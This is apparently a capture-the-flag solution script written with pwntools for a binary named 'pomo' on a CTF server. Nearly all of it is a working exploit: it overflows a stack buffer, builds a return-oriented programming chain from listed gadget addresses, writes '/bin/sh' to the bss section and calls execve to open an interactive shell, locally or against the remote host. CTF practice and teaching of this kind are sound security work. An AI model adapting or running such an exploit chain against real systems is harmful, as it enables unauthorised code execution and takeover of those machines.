#!/usr/bin/python
from pwn import *
import sys

config = {
	"elf" : "./pomo",
	"libc" : "/usr/lib/libc.so.6",#"./libc-2.23.so",
	"HOST" : "chals.ctf.sg",
	"PORT" : 20201
}

def exploit(r):
    '''
    0x0000000000463f6f: mov qword ptr [rdi], rax; ret;
    0x0000000000457ca4: pop rdi; sete byte ptr [rsp + 0x10]; ret;
    0x0000000000403c0d: pop rax; ret;
    0x00000000004648ad: pop rbp; ret;
    0x0000000000407fa1: pop rbx; ret;
    0x00000000004188e2: pop rdx; ret;
    0x00000000004387be: pop rsi; ret;
    0x000000000041792b: pop rsp; ret;
    0x00000000004648e9: syscall; ret;
    0x0000000000556a20: bss
    '''

    mov_write = p64(0x0000000000463f6f)
    pop_rdi = p64(0x0000000000457ca4)
    pop_rax = p64(0x0000000000403c0d)
    pop_rbp = p64(0x00000000004648ad)
    pop_rbx = p64(0x0000000000407fa1)
    pop_rdx = p64(0x00000000004188e2)
    pop_rsi = p64(0x00000000004387be)
    pop_rsp = p64(0x000000000041792b)
    syscall = p64(0x00000000004648e9)
    bss = p64(0x0000000000556a20)

    payload = cyclic(24)
    payload += bss
    payload += mov_write
    payload += pop_rdx
    payload += "BBBBCCCC"

    payload += pop_rax
    payload += '/bin/sh\x00'
    payload += pop_rdi
    payload += bss
    payload += mov_write
    payload += pop_rdx
    payload += p64(0)
    payload += pop_rax
    payload += p64(0x3b)
    payload += pop_rsi
    payload += p64(0)
    payload += syscall
    r.sendline(payload)
    r.interactive()
    return

if __name__ == "__main__":
    if "elf" in config.keys() and config["elf"]:
        e = ELF(config["elf"])
    if "libc" in config.keys() and config["libc"]:
        libc = ELF(config["libc"])

    if "remote" in sys.argv:
        r = remote(config["HOST"], config["PORT"])
    else:
        if "libc" in dir():
            r = process(config["elf"], env={"LD_PRELOAD" : config["libc"]})
        else:
            r = process(config["elf"])

        print util.proc.pidof(r)
        if "debug" in sys.argv:
                pause()
    exploit(r)
